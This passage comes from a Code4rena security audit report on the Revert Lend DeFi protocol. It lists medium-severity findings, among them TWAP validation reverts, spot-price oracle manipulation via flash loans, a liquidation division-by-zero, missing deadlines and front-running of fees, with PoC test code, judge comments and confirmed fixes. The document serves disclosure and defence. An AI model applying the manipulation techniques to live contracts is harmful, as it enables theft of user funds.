function _getTWAPTick(IUniswapV3Pool pool, uint32 twapPeriod) internal view returns (int24, bool) {

        uint32[] memory secondsAgos = new uint32[](2);

        secondsAgos[0] = 0; // from (before)

        secondsAgos[1] = twapPeriod; // from (before)


        // pool observe may fail when there is not enough history available

        try pool.observe(secondsAgos) returns (int56[] memory tickCumulatives, uint160[] memory) {

            return (int24((tickCumulatives[0] - tickCumulatives[1]) / int56(uint56(twapPeriod))), true);

        } catch {

            return (0, false);

        }

    }
The function will revert if the difference between current tick and twap tick > maxTickDifference. Currently, maxTickDifference must <= 200 as you can see in function setTWAPConfig:

function setTWAPConfig(uint16 _maxTWAPTickDifference, uint32 _TWAPSeconds) public onlyOwner {

        if (_TWAPSeconds < MIN_TWAP_SECONDS) {

            revert InvalidConfig();

        }

        if (_maxTWAPTickDifference > MAX_TWAP_TICK_DIFFERENCE) {

            revert InvalidConfig();

        }

        emit TWAPConfigChanged(_TWAPSeconds, _maxTWAPTickDifference);

        TWAPSeconds = _TWAPSeconds;

        maxTWAPTickDifference = _maxTWAPTickDifference;

    }
MAX_TWAP_TICK_DIFFERENCE = 200.

If for example, maxTWAPTickDifference = 100, then the function will revert if price difference = 1.0001 * 100 = 1%. This will prevent users of AutoExit and AutoRange from stopping their loss in case the market drops > 1%.

Lets take an example:

Alice chooses AutoRange transformer.
Then AutoRange.execute is called with amountIn = 0, according to the comment in AutoRange.ExecuteParams struct, then if amountIn = 0, it means no swap:
struct ExecuteParams {

        uint256 tokenId;

        bool swap0To1;

        uint256 amountIn; // if this is set to 0 no swap happens

        bytes swapData;

        uint128 liquidity; // liquidity the calculations are based on

        uint256 amountRemoveMin0; // min amount to be removed from liquidity

        uint256 amountRemoveMin1; // min amount to be removed from liquidity

        uint256 deadline; // for uniswap operations - operator promises fair value

        uint64 rewardX64; // which reward will be used for protocol, can be max configured amount (considering onlyFees)

    }
In case of no swap, Alice just wants to withdraw her tokens and cut loss.
However, after AutoRange has called _decreaseFullLiquidityAndCollect to withdraw tokens for Alice, AutoRange still call _validateSwap to check (although amountIn is set to 0 - meaning no swap):
        (state.amount0, state.amount1, state.feeAmount0, state.feeAmount1) = _decreaseFullLiquidityAndCollect(

            params.tokenId, state.liquidity, params.amountRemoveMin0, params.amountRemoveMin1, params.deadline

        );


        ...

        // check oracle for swap

        (state.amountOutMin, state.currentTick,,) = _validateSwap(

            params.swap0To1,

            params.amountIn,

            state.pool,

            TWAPSeconds,

            maxTWAPTickDifference,

            params.swap0To1 ? config.token0SlippageX64 : config.token1SlippageX64

        );
If (currentTick - twapTick) > 100 (meaning 1% price difference), then the transaction will revert and the operator failed to stop Alice’s loss.
Alice has to wait when the condition (currentTick - twapTick) < 100 to cut loss, by then it’s too late.
The same thing happens in AutoExit, users cannot withdraw their tokens in case the prices change > 1%.

Below is a POC for the above example, save this test case to file test/integration/automators/AutoRange.t.sol and run it using command: forge test --match-path test/integration/automators/AutoRange.t.sol --match-test testNoSwapRevert -vvvv.

function testNoSwapRevert() public {

        bool onlyFees = false;

        SwapTestState memory state;



        // Config AutoRange

        vm.startPrank(TEST_NFT_2_ACCOUNT);

        NPM.setApprovalForAll(address(autoRange), true);

        autoRange.configToken(

            TEST_NFT_2,

            address(0),

            AutoRange.PositionConfig(

                0, 0, 0, 60, uint64(Q64 / 100), uint64(Q64 / 100), onlyFees, onlyFees ? MAX_FEE_REWARD : MAX_REWARD

            )

        );


        (,,,,,,, state.liquidity,,,,) = NPM.positions(TEST_NFT_2);

        vm.stopPrank();


        //

        (, int24 currentTick,,,,,) = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8).slot0();

        console.logInt(currentTick);


        // mock twap data

        // _maxTWAPTickDifference is currently set as 100

        // twapPeriod is 60,

        // currenttick = -73244

        // so the mock twap price  = (-6912871013261 - -6912866037401) / 60 = -82931

        int56[] memory tickCumulative = new int56[](2);

        tickCumulative[0] = -6912871013261;

        tickCumulative[1] = -6912866037401;


        uint32[] memory secondsAgos = new uint32[](2);

        secondsAgos[0] = 0;

        secondsAgos[1] = 60;

        uint160[] memory secondsPerLiquidityCumulativeX128s = new uint160[](2);


        vm.mockCall(

            0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8,(abi.encodeWithSelector(0x883bdbfd,secondsAgos)),

            abi.encode(tickCumulative,secondsPerLiquidityCumulativeX128s)

        );


        //Operator run

        vm.prank(OPERATOR_ACCOUNT);

        vm.expectRevert();

        autoRange.execute(

            AutoRange.ExecuteParams(

                TEST_NFT_2, false, 0, "", state.liquidity, 0, 0, block.timestamp, onlyFees ? MAX_FEE_REWARD : MAX_REWARD

            )

        );

    }
In the test case, I creates a mockCall to uniswap v3 observe function to simulate a market drop.

Recommended Mitigation Steps
I recommend skipping the swap operation if _hasMaxTWAPTickDifference returns false instead of reverting.

Assessed type
Invalid Validation

EV_om (lookout) commented:

Users have no control over the timing of Automator calls, operators do. If a user wants to quickly exit a position, they can repay.

This is an in-built protection mechanism.

ktg (warden) commented:

@EV_om, AutoExit will be called by a bot, users uses a bot to avoid manually exiting their UniswapV3 positions so I think the point If a user wants to quickly exit a position, they can repay. is not related.

What I meant in this issue is that even if amountIn is set to 0 (which means no swap), the code still call _validateSwap and revert if the price fluctuation is too high. Therefore, if execute is called with amountIn = 0 (which clearly indicates no swap, just withdraw and exit) and the price fluctuation is too high, it will revert. In another word, the code check the condition and revert in situations where users/callers clearly want to neglect that condition.

About This is an in-built protection mechanism., I think this is indeed a built-in protection mechanism, but that mechanism is only for cases where swap is needed. In this issue, this mechanism is still activated even when users don’t want it and result in their losses.

EV_om (lookout) commented:

You’re right, repayment of positions is unrelated, my bad. What I should have said was “If a user wants to quickly exit a position, they can do so manually.” As for the no swap case, there is no loss being prevented as the position owner will remain exposed to the same price action.

Nevertheless, the unnecessary call to _validateSwap() and resulting reverting behavior is a good observation. The judge may want to consider this as QA despite the overinflated severity and invalid assumptions of the original submission.

ktg (warden) commented:

@EV_om , @ronnyx2017 - I think the statement If a user wants to quickly exit a position, they can do so manually. is also unrelated here because the role of AutoExit is to help users automatically exit a position. You can’t expect users to look at market data and exit manually all the time; that’s why AutoExit/AutoRange exists.

The loss here is that AutoExit cannot help users to automatically exit a position because it reverts on a condition that clearly needed to be omitted due to amountIn =0 (no swap).

I think we all agree that the call to _validateSwap() is unnecessary here but I disagree that it’s just a QA because it can cost huge loss due to users (through AutoExit or AutoRange) unable to exit or re arrange their position.

If users choose to set amountIn (or swapAmount) = 0, then what they want is “I don’t want to swap, just exit/autorange my position”, but then AutoExit/AutoRange fails to do this.

ronnyx2017 (judge) decreased severity to Medium and commented:

Good catch! Unnecessary _validateSwap here has genuinely compromised certain functionalities of the protocol. Medium is justified, in my opinion. Looking forward to the sponsor’s perspective, @kalinbas.

kalinbas (Revert) confirmed and commented:

_validateSwap() is not necessary only if there is no swap, we are going to remove if in that case.

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in reports from b0g0, thank_you and ktg.

[M-19] V3Oracle susceptible to price manipulation
Submitted by b0g0, also found by 0x175, 14si2o_Flint, kfx, Fitro, Giorgio, grearlake, 0xblackskull (1, 2), crypticdefense, Silvermist, 0xspryon, MohammedRizwan, y0ng0p3, 0xAlix2, MSaptarshi, boredpukar, and maxim371

V3Oracle::getValue() is used to calculate the value of a position. The value is the product of the oracle price * the amounts held in the position. Price manipulation is prevented by checking for differences between Chainlink oracle and Uniswap TWAP.

However, the amounts (amount0 and amount1) of the tokens in the position are calculated based on the current pool price (pool.spot0()), which means they can be manipulated. Since the value of the total position is calculated from amount0 and amount1 it can be manipulated as well.

Proof of Concept
Invoking V3Oracle::getValue() first calls the getPositionBreakdown() to calculate the amount0 and amount1 of the tokens in the position based on spot price:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L102

 (address token0, address token1, uint24 fee,, uint256 amount0, uint256 amount1, uint256 fees0, uint256 fees1) =

            getPositionBreakdown(tokenId);
Under the hood this calls _initializeState() which gets the current price in the pool:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L395

(state.sqrtPriceX96, state.tick,,,,,) = state.pool.slot0();
Based on this value the amount0 and amount1 (returned from getPositionBreakdown() are deduced:

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L426

function _getAmounts(PositionState memory state)

        internal

        view

        returns (uint256 amount0, uint256 amount1, uint128 fees0, uint128 fees1)

    {

        if (state.liquidity > 0) {

       ....

            (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(

                state.sqrtPriceX96, state.sqrtPriceX96Lower, state.sqrtPriceX96Upper, state.liquidity

            );

        }

       ....

    }
After that, the prices are fetched from Uniswap & Chainlink and compared.

 (price0X96, cachedChainlinkReferencePriceX96) =

            _getReferenceTokenPriceX96(token0, cachedChainlinkReferencePriceX96);

 (price1X96, cachedChainlinkReferencePriceX96) =

            _getReferenceTokenPriceX96(token1, cachedChainlinkReferencePriceX96);
Finally, the value of the positions tokens and fees are calculated in the following formula:

value = (price0X96 * (amount0 + fees0) / Q96 + price1X96 * (amount1 + fees1) / Q96) * Q96 / priceTokenX96;

feeValue = (price0X96 * fees0 / Q96 + price1X96 * fees1 / Q96) * Q96 / priceTokenX96;

price0X96 = price0X96 * Q96 / priceTokenX96;

price1X96 = price1X96 * Q96 / priceTokenX96;
Basically the position value is a product of 2 parameters price0X96/price1X96 and amount0/amount1:

price0X96/price1X96 - are the prices derived from the oracles. They are validated and cannot be manipulated.
amount0/amount1 - are calculated based on the spot price and can be manipulated.
Since amount0 and amount1 can be increased/decreased if a malicious user decides to distort the pool price in the current block (through a flash loan for example), this will directly impact the calculated value, even though the price itself cannot be manipulated since it is protected against manipulation.

The check in the end _checkPoolPrice() only verifies that the price from the oracles is in the the acceptable ranges. However, this does not safeguard the value calculation, which as explained above also includes the amounts parameters.

It should be noted that _checkPoolPrice uses the uniswap TWAP price for comparison, which is the price over an extended period of time making it very hard to manipulate in a single block. And exactly this property of the TWAP price can allow an attacker to manipulate the spot price significantly, without affecting the TWAP much; which means the price difference won’t change much and _checkPoolPrice will pass.

A short example:

The V3Oracle has been configured to use a TWAP duration of 1 hour.
The TWAP price reported for the last hour is 4000 USDC for 1 WETH.
Bob takes a flash loan to distort the spot price heavily and call in the same transaction borrow | repay on a V3Vault (which call V3Oracle.getValue()).
Because of the price manipulation amount1 and amount0 are heavily inflated/deflated.
However this changes the TWAP value only a little (if at all), so the price validation passes.
The position value is calculated by multiplying the stable oracle price by the heavily manipulated amounts.
User repay/borrows at favorable conditions.
Recommended Mitigation Steps
Consider calculating amount0 & amount1 based on the oracle price and not on the spot price taken from slot0(). This way the above exploit will be mitigated.

Assessed type
Uniswap

kalinbas (Revert) commented:

The check in _checkPoolPrice() does limit the price manipulation. The current pool price (it is NOT the TWAP price as you mention) is compared to the derived pool price of the Chainlink oracle prices.

The amounts may be slightly manipulated for wide range positions, and more heavily manipulated for tight range positions. But the protection with _checkPoolPrice() should be enough to protect this from being a problem. Also, repay() does not need any oracles.

ronnyx2017 (judge) decreased severity to Medium and commented:

I think it is reasonable to classify this issue as Medium.

Firstly, I think that the possibility of exploitation exists only within the _checkPoolPrice method.

Secondly, although it would require very fringe (and even incorrect) configuration parameters to really cause un-dusty losses, given that similar attacks have occurred on the mainnet with substantial losses (refer to the Gamma gDai TWAP verification range configuration error, even though it’s unrelated to slot0), I believe it’s worth adding necessary safeguards, especially for tight range positions and tokens.

kalinbas (Revert) confirmed and commented:

We agree to change it to use the oracle price for position token calculation.

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-20] Tokens can’t be removed as a collateral without breaking liquidations and other core functions
Submitted by iamandreiski, also found by 0xAlix2

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L856-L866

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1197-L1202

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1270-L1278

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L702-L703

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1090-L1120

Impact
The core mechanism that Revert utilizes to prevent arbitrary tokens to be utilized as collateral is by the default setting of the collateralFactor. Since the collateralFactor for all tokens (besides the ones approved for usage in the system, and set by admins) is 0, that means that no one can borrow against a collateral which hasn’t been approved.

The problem arises when admins would want a collateral removed from the system. There would be multiple reasons as to why this might be the case:

The underlying collateral has become too volatile.
The DAO in charge of Revert protocol decides to remove it as a collateral.
There has been some kind of a change in the mechanics of how that token operates and Revert wants it removed (e.g. upgradeable tokens, most-popular examples include USDC/USDT).
The only way in which this could be performed is to set the collateralFactor back to 0, but this would break core mechanics such as liquidations.

Proof of Concept
All approved collateral which admins decided should be utilized inside of the protocol is introduced by increasing the collateralFactor through setTokenConfig():

 function setTokenConfig(address token, uint32 collateralFactorX32, uint32 collateralValueLimitFactorX32)

        external

        onlyOwner

    {

        if (collateralFactorX32 > MAX_COLLATERAL_FACTOR_X32) {

            revert CollateralFactorExceedsMax();

        }

        tokenConfigs[token].collateralFactorX32 = collateralFactorX32;

        tokenConfigs[token].collateralValueLimitFactorX32 = collateralValueLimitFactorX32;

        emit SetTokenConfig(token, collateralFactorX32, collateralValueLimitFactorX32);

    }
Once a token’s collateralFactor was set, and removed afterward due to extraordinary circumstances, all outstanding loans will never be able to be liquidated either due to panic reverts because of overflow/underflow or panic reverts due to division/modulo by 0.

The problem arises when _checkLoanIsHealthy() is called within liquidate() (the same can be tested by calling loanInfo() as well, since it also calls _checkLoanIsHealthy()).

  function _checkLoanIsHealthy(uint256 tokenId, uint256 debt)

        internal

        view

        returns (bool isHealthy, uint256 fullValue, uint256 collateralValue, uint256 feeValue)

    {

        (fullValue, feeValue,,) = oracle.getValue(tokenId, address(asset));

        uint256 collateralFactorX32 = _calculateTokenCollateralFactorX32(tokenId);

        collateralValue = fullValue.mulDiv(collateralFactorX32, Q32);

        isHealthy = collateralValue >= debt;

    }
This happens because when calculating the collateralValue through _checkLoanIsHealthy as it can be seen here:

function _checkLoanIsHealthy(uint256 tokenId, uint256 debt)

        internal

        view

        returns (bool isHealthy, uint256 fullValue, uint256 collateralValue, uint256 feeValue)

    {

        (fullValue, feeValue,,) = oracle.getValue(tokenId, address(asset));

        uint256 collateralFactorX32 = _calculateTokenCollateralFactorX32(tokenId);

        collateralValue = fullValue.mulDiv(collateralFactorX32, Q32);

        isHealthy = collateralValue >= debt;

    }
Since it’s needed to calculate the liquidation collateral value as it can be seen in the liquidate() function:

(state.isHealthy, state.fullValue, state.collateralValue, state.feeValue) =

            _checkLoanIsHealthy(params.tokenId, state.debt);
Since the collateral factor will be 0, the collateralValue will also be 0, this will lead to passing 0 as a value in the _calculateLiquidation() function:

 (state.liquidationValue, state.liquidatorCost, state.reserveCost) =

            _calculateLiquidation(state.debt, state.fullValue, state.collateralValue);
Which will always revert due to division with 0:

unction _calculateLiquidation(uint256 debt, uint256 fullValue, uint256 collateralValue)

        internal

        pure

        returns (uint256 liquidationValue, uint256 liquidatorCost, uint256 reserveCost)

    {

            ...

            uint256 startLiquidationValue = debt * fullValue / collateralValue;

            ...
This can be tested via PoC, by inserting the following line in the testLiquidation() test in V3Vault.t.sol:

vault.setTokenConfig(address(USDC), 0, type(uint32).max); vault.setTokenConfig(address(DAI), 0, type(uint32).max)

You can change USDC/DAI one or both with whatever collateral is part of the NFT in question and run testLiquidationTimeBased().

Recommended Mitigation Steps
Don’t use the collateralFactor as the common denominator whether a token is accepted as collateral or not; use a method such as whitelisting tokens by address and performing necessary checks to see if the token address matches the whitelist.

Assessed type
DoS

kalinbas (Revert) confirmed, but disagreed with severity

ronnyx2017 (judge) decreased severity to Medium and commented:

Valid DOS, but needs admin config upgrade. Since the modification of this config is reasonable and normal, it is classified as Medium.

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in reports from b0g0, thank_you and ktg.

[M-21] Dangerous use of deadline parameter
Submitted by y0ng0p3, also found by 0xk3y, falconhoof, Mike_Bello90, Myd, th3l1ghtd3m0n, 0xspryon, and lightoasis

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/transformers/AutoCompound.sol#L159-L172

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1032-L1074

Vulnerability details
The protocol is using block.timestamp as the deadline argument while interacting with the Uniswap NFT Position Manager, which completely defeats the purpose of using a deadline.

Actions in the Uniswap NonfungiblePositionManager contract are protected by a deadline parameter to limit the execution of pending transactions. Functions that modify the liquidity of the pool check this parameter against the current block timestamp in order to discard expired actions.

These interactions with the Uniswap position are present throughout the code base, in particular and not only in the functions: V3Utils::_swapAndMint, Automator::_decreaseFullLiquidityAndCollect, LeverageTransformer::leverageUp. Those functions call their corresponding functions in the Uniswap Position Manager, providing the deadline argument with their own deadline argument.

On the other hand, AutoCompound::execute and V3Vault::_sendPositionValue functions provide block.timestamp as the argument for the deadline parameter in their call to the corresponding underlying Uniswap NonfungiblePositionManager contract.

File: src/transformers/AutoCompound.sol


// deposit liquidity into tokenId

if (state.maxAddAmount0 > 0 || state.maxAddAmount1 > 0) {

    _checkApprovals(state.token0, state.token1);



    (, state.compounded0, state.compounded1) = nonfungiblePositionManager.increaseLiquidity(

        INonfungiblePositionManager.IncreaseLiquidityParams(

@@->    params.tokenId, state.maxAddAmount0, state.maxAddAmount1, 0, 0, block.timestamp

        )

    );



    // fees are always calculated based on added amount (to incentivize optimal swap)

    state.amount0Fees = state.compounded0 * rewardX64 / Q64;

    state.amount1Fees = state.compounded1 * rewardX64 / Q64;

}
File: src/V3Vault.sol


if (liquidity > 0) {

    nonfungiblePositionManager.decreaseLiquidity(

        INonfungiblePositionManager.DecreaseLiquidityParams(tokenId, liquidity, 0, 0, block.timestamp)

    );

}
Using block.timestamp as the deadline is effectively a no-operation that has no effect nor protection. Since block.timestamp will take the timestamp value when the transaction gets mined, the check will end up comparing block.timestamp against the same value (see here).

Impact
Failure to provide a proper deadline value enables pending transactions to be maliciously executed at a later point. Transactions that provide an insufficient amount of gas such that they are not mined within a reasonable amount of time, can be picked by malicious actors or MEV bots and executed later in detriment of the submitter. See this issue for an excellent reference on the topic (the author runs a MEV bot).

Recommended Mitigation Steps
As done in the LeverageTransformer::leverageUp and V3Utils::_swapAndIncrease functions, add a deadline parameter to the AutoCompound::execute and V3Vault::_sendPositionValue functions and forward this parameter to the corresponding underlying call to the Uniswap NonfungiblePositionManager contract.

kalinbas (Revert) confirmed

Revert mitigated:

PR here - added deadline where missing.

Status: Mitigation Confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-22] dailyDebtIncreaseLimitLeft is not updated in liquidate()
Submitted by lanrebayode77, also found by Aymen0909 and 0xAlix2

On days with a significant number of liquidated positions, particularly when the asset quantity is substantial, there will be an excess of assets available in the vault that cannot be borrowed; thereby, causing a drastic decrease in the utilization rate.

This also contradicts what was stated in the repay() function, which asserts that repaid amounts should be borrowed again. Liquidation is also a form of repayment:

 // when amounts are repayed - they may be borrowed again

        dailyDebtIncreaseLimitLeft += assets; 
Proof of Concept
dailyDebyIncreaseLimitLeft was not increamented in liquidate(), see here.

Recommended Mitigation Steps
Include dailyDebyIncreaseLimitLeft increment in liquidate().

dailyDebtIncreaseLimitLeft += state.liquidatorCost;
Assessed type
Context

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-23] AutoRange execution can be front-ran to avoid protocol fee, causing loss for protocol
Submitted by 0xjuan

When users configure their NFT within the AutoRange contract, they have 2 options for fee-handling:

Protocol takes 0.15% of the entire position size.
Protocol takes a higher fee of 2%, but only from the position’s collected fees.
The user sets PositionConfig.onlyFees=false for the first option, and onlyFees=true for the second option. When an operator calls the AutoRange.execute() function, they set the reward parameter rewardX64 based on the user’s PositionConfig.

However, the execution can be front-ran by the user. They can change the onlyFees boolean, which changes the fee handling logic, while the rewardX64 parameter set by the operator is unchanged.

The user can exploit this to their advantage by initially setting onlyFees to false, so that the operator will call the function with only 0.15% reward percentage. But when the operator sends their transaction, the user front-runs it by changing onlyFees to true. Now, the protocol only gets 0.15% of the fees collected when they initially intended to collect 0.15% of the entire position.

Impact
The cost of executing the swap is likely to exceed the fees obtained (since expected fee is 0.15% of entire position, but only 0.15% of fees are obtained). This leads to loss of funds for the protocol.

Note: this has been submitted as only a medium severity issue since the protocol’s off-chain operator logic can simply blacklist such users once they have performed the exploit.

Proof of Concept
See the rewardX64 parameter and docs regarding fee source.

Recommended Mitigation Steps
Let the operator pass in 2 different values for rewardX64, where each one corresponds to a different value of onlyFees. This way, the rewardX64 parameter passed in will not be inconsistent with the executed logic.

Assessed type
MEV

kalinbas (Revert) acknowledged and commented:

As you mentioned we are solving this with the bot off-chain; it is a valid finding.

[M-24] Incorrect liquidation fee calculation during underwater liquidation, disincentivizing liquidators to participate
Submitted by 0xjuan

As stated in the Revert Lend Whitepaper, the liquidation fee for underwater positions is supposed to be 10% of the debt. However, the code within V3Vault::_calculateLiquidation (shown below) calculates the liquidation fee as 10% of the fullValue rather than 10% of the debt.

        } else {

            // all position value

            liquidationValue = fullValue;



            uint256 penaltyValue = fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;

            liquidatorCost = penaltyValue;

            reserveCost = debt - penaltyValue;

        }
Note: fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32; is equivalent to fullValue * 90%.

The code snippet is here.

Impact
As the fullValue decreases below debt (since the position is underwater), liquidators are less-and-less incentivised to liquidate the position. This is because as fullValue decreases, the liquidation fee (10% of fullValue) also decreases.

This goes against the protocol’s intention (stated in the whitepaper) that the liquidation fee will be fixed at 10% of the debt for underwater positions, breaking core protocol functionality.

Proof of Concept
Code snippet from V3Vault._calculateLiquidation.

Recommended Mitigation Steps
Ensure that the liquidation fee is equal to 10% of the debt. Make the following changes in V3Vault::_calculateLiquidation():

else {

-// all position value

-liquidationValue = fullValue;



-uint256 penaltyValue = fullValue * (Q32 - MAX_LIQUIDATION_PENALTY_X32) / Q32;

-liquidatorCost = penaltyValue;

-reserveCost = debt - penaltyValue;


+uint256 penalty = debt * (MAX_LIQUIDATION_PENALTY_X32) / Q32; //[10% of debt]

+liquidatorCost = fullValue - penalty;

+liquidationValue = fullValue;

+reserveCost = debt - liquidatorCost; // Remaining to pay. 

}   
Assessed type
Error

kalinbas (Revert) confirmed, but disagreed with severity and commented:

Low severity.

ronnyx2017 (judge) decreased severity to Medium and commented:

According to the C4 rules, Medium is appropriate, as this disrupts certain designs in the economic model.

Revert mitigated:

PR here - fixed calculation.

Status: Mitigation Confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-25] Asymmetric calculation of price difference
Submitted by t4sk, also found by Bauchibred, lanrebayode77, and hunter_w3b

Price difference is calculated in 2 ways depending on whether price > verified price or not.

If price > verified price, this is the equation:

(price - verified price) / price
Otherwise price is calculated with this equation:

(verified price - price) / verified price
When the 2 equations above are graphed with price = horizontal axis, we get 2 different curves, see here.

The first equation produces a asymptotic curve (shown in red). The second equation produces a linear curve (shown in green). Therefore, the rate at which the price difference changes is different depending on whether price > verified price or not.

Example
Price difference of +1 or -1 from verified price are not symmetric:

# p < v

v = 2

p = 1

d = (v - p) / v

print(d)

# output is 0.5
# p > v

v = 2

p = 3

d = (p - v) / p

print(d)

# output is 0.33333
Tools Used
Desmos graphing calculator and python

Recommended Mitigation Steps
Use a different equation to check price difference (shown in blue here):

|price - verified price| / verified price <= max difference
Assuming verifyPriceX96 > 0:

        uint256 diff = priceX96 >= verifyPriceX96

            ? (priceX96 - verifyPriceX96) * 10000

            : (verifyPriceX96 - priceX96) * 10000;

        

        require(diff / verifyPriceX96 <= maxDifferenceX1000)
Assessed type
Math

kalinbas (Revert) confirmed

Revert mitigated:

PR here - fixed calculation.

Status: Mitigation Confirmed. Full details in reports from ktg and b0g0.

[M-26] Some ERC20 can revert on a zero value transfer
Submitted by DadeKuma

Note: This finding was reported via the winning Automated Findings report. It was declared out of scope for the audit, but is being included here for completeness.

728, 946, 226, 272, 88, 91, 872, 85, 98, 167

Vulnerability details
Not all ERC20 implementations are totally compliant, and some (e.g. LEND) may fail while transferring a zero amount.

File: src/V3Vault.sol


728: 		            SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);


946: 		        SafeERC20.safeTransfer(IERC20(asset), receiver, assets);
File: src/automators/Automator.sol


226: 		            SafeERC20.safeTransfer(token, to, amount);
File: src/transformers/AutoCompound.sol


272: 		        SafeERC20.safeTransfer(IERC20(token), to, amount);
File: src/transformers/LeverageTransformer.sol


88: 		            SafeERC20.safeTransfer(IERC20(token0), params.recipient, amount0 - added0);


91: 		            SafeERC20.safeTransfer(IERC20(token1), params.recipient, amount1 - added1);
File: src/transformers/V3Utils.sol


872: 		            SafeERC20.safeTransfer(token, to, amount);
File: src/utils/FlashloanLiquidator.sol


85: 		        SafeERC20.safeTransfer(data.asset, msg.sender, data.liquidationCost + (fee0 + fee1));
File: src/utils/Swapper.sol


98: 		                SafeERC20.safeTransfer(params.tokenIn, universalRouter, params.amountIn);


167: 		        SafeERC20.safeTransfer(IERC20(tokenIn), msg.sender, amountToPay);
kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-27] Missing L2 sequencer checks for Chainlink oracle
Submitted by DadeKuma

Note: This finding was reported via the winning Automated Findings report. It was declared out of scope for the audit, but is being included here for completeness.

337

Vulnerability details
Using Chainlink in L2 chains such as Arbitrum requires to check if the sequencer is down to avoid prices from looking like they are fresh although they are not.

The bug could be leveraged by malicious actors to take advantage of the sequencer downtime.

File: src/V3Oracle.sol


// @audit missing sequencer uptime, grace period checks

337: 		        (, int256 answer,, uint256 updatedAt,) = feedConfig.feed.latestRoundData();
kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation Error. Full details in reports from ktg, b0g0 and thank_you, and also included in the Mitigation Review section below.

Low Risk and Non-Critical Issues
For this audit, 43 reports were submitted by wardens detailing low risk and non-critical issues. The report highlighted below by Bauchibred received the top score from the judge.

The following wardens also submitted reports: cryptphi, thank_you, FastChecker, Norah, Arabadzhiev, santiellena, btk, VAD37, CRYP70, kfx, zaevlad, 14si2o_Flint, ktg, Bigsam, jnforja, kennedy1030, 0xspryon, MohammedRizwan, t4sk, 0xAlix2, adeolu, y0ng0p3, lanrebayode77, Timenov, tpiliposian, 0x11singh99, JecikPo, BowTiedOriole, grearlake, 0x175, 0xPhantom, wangxx2026, givn, Aymen0909, 0xGreyWolf, KupiaSec, crypticdefense, 0xDemon, stonejiajia, Topmark, DanielArmstrong, and n1punp.

[01] _checkApprovals should be reimplemented to count for the allowance depleting
The function _checkApprovals is designed to only set approvals if the current allowance is zero. This is a one-time setup meant to minimize gas costs associated with setting allowances for token transfers.

function _checkApprovals(address token0, address token1) internal {

    uint256 allowance0 = IERC20(token0).allowance(address(this), address(nonfungiblePositionManager));

    if (allowance0 == 0) {

        SafeERC20.safeApprove(IERC20(token0), address(nonfungiblePositionManager), type(uint256).max);

    }

    uint256 allowance1 = IERC20(token1).allowance(address(this), address(nonfungiblePositionManager));

    if (allowance1 == 0) {

        SafeERC20.safeApprove(IERC20(token1), address(nonfungiblePositionManager), type(uint256).max);

    }

}
While setting the allowance to type(uint256).max reduces the need for repeated approvals (and thus saves gas), it neglects the scenario where the allowance might be fully utilized. In typical use cases, reaching type(uint256).max would require an unrealistic volume of transactions. However, it does not account for potential bugs, exploits, or changes in contract logic that could deplete this allowance unexpectedly.

Impact
The current implementation of the _checkApprovals function sets the token allowance to type(uint256).max for the nonfungiblePositionManager contract, intending to save on gas costs for future transactions. However, this approach introduces a vulnerability where, once the type(uint256).max allowance is exhausted, there would be no mechanism in place to renew the approval. This could lead to a situation where the smart contract is unable to perform operations requiring token transfers on behalf of users, effectively freezing any functionality dependent on these approvals.

Recommended Mitigation Steps
Instead of only checking for an allowance of zero, implement a mechanism to check if the allowance is below a certain threshold and, if so, replenish it.

[02] Setters should always have equality checkers
Using this search prompt code, we can see that multiple setter functions exist in scope, with them not having any check that the new accepted value is not equal to the previously stored value.

For example, setReward() checks that the new value is <= whereas it should only check < leading to an unnecessary update of totalRewardX64 if _totalRewardX64 is already == totalRewardX64.

    function setReward(uint64 _totalRewardX64) external onlyOwner {

        require(_totalRewardX64 <= totalRewardX64, ">totalRewardX64");

        totalRewardX64 = _totalRewardX64;

        emit RewardUpdated(msg.sender, _totalRewardX64);

    }
Another example would be the below, that does not implement any checks whatsoever:

 function setWithdrawer(address _withdrawer) public onlyOwner {

 emit WithdrawerChanged(_withdrawer);

withdrawer = _withdrawer;

}
Impact
Unnecessary code execution.

Recommended Mitigation Steps
Introduce equality checkers for setter functions.

[03] Introduce better naming conventions
Taking a look here, we can see that this is used to declare the MIN_PRICE_DIFFERENCE as 2%. The issue is that this value is actually the min max price difference, see here.

    function setMaxPoolPriceDifference(uint16 _maxPoolPriceDifference) external onlyOwner {

